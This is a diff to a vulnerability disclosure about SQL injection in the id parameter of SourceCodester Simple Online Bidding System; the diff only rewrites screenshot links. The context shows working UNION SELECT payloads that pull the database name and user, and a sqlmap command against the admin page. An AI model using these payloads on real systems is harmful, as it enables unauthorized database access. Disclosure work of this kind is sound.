@@ -12,7 +12,7 @@ injection parameter:$_Get['id']
 
 The parameter $_Get['id'] here is directly spliced into the sql statement after removing the null value. There is a sql injection point.
 
-![image-20240515150743003](SourceCodester Simple Online Bidding System Sql Inject-2.assets/image-20240515150743003.png)
+![image-20240515150743003](https://github.com/rockersiyuan/CVE/blob/main/SourceCodester%20Simple%20Online%20Bidding%20System%20Sql%20Inject-2.assets/image-20240515150743003.png)
 
 #### 2.Vulnerability verification and exploit
 
@@ -24,7 +24,7 @@ First, you can test that the number of queries is 9, and further test the echo p
 page=view_udet&id=-2+union+select+1,2,3,4,5,6,7,8,9%23
 ```
 
-![image-20240515151020239](SourceCodester Simple Online Bidding System Sql Inject-2.assets/image-20240515151020239.png)
+![image-20240515151020239](https://github.com/rockersiyuan/CVE/blob/main/SourceCodester%20Simple%20Online%20Bidding%20System%20Sql%20Inject-2.assets/image-20240515151020239.png)
 
 Then you can select 5 and 6 as the echo positions, modify the payload to query the database name and current database user name.
 
@@ -32,7 +32,7 @@ Then you can select 5 and 6 as the echo positions, modify the payload to query t
 page=view_udet&id=-2+union+select+1,2,3,4,database(),user(),7,8,9%23
 ```
 
-![image-20240515151147953](SourceCodester Simple Online Bidding System Sql Inject-2.assets/image-20240515151147953.png)
+![image-20240515151147953](https://github.com/rockersiyuan/CVE/blob/main/SourceCodester%20Simple%20Online%20Bidding%20System%20Sql%20Inject-2.assets/image-20240515151147953.png)
 
 We can also use sqlmap to conduct injection point testing. The test results are shown in the figure below. There are also SQL injection vulnerabilities that can be exploited.
 
@@ -40,4 +40,4 @@ We can also use sqlmap to conduct injection point testing. The test results are 
 python sqlmap.py -u "http://x.x.x.x/admin/index.php?page=view_udet&id=1" --cookie="PHPSESSID=xxxxxxxxxxxxxxxxxxxxx" --batch
 ```
 
-![image-20240515160859747](SourceCodester Simple Online Bidding System Sql Inject-2.assets/image-20240515160859747.png)
+![image-20240515160859747](https://github.com/rockersiyuan/CVE/blob/main/SourceCodester%20Simple%20Online%20Bidding%20System%20Sql%20Inject-2.assets/image-20240515160859747.png)
